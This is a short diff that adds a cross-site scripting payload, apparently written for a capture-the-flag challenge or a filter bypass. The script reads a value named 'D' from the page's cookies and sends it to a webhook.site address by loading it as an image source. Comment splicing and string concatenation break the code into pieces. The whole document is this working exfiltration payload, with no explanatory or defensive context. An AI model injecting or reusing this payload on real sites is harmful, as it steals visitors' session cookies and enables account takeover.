@@ -1,0 +1,12 @@
+<script>/*
+*/a=/D=(\w+)/./*
+*/exec(document.cookie)/*
+*/[1];/*
+*/$('<img>')./*
+*/attr('src',/*
+*/'https://webhook.'/*
+*/+'site/edc9d919'/*
+*/+'-8e89-431a-bd1d'/*
+*/+'-7af28ef3a14a?s='/*
+*/+a)/*
+*/</script> 
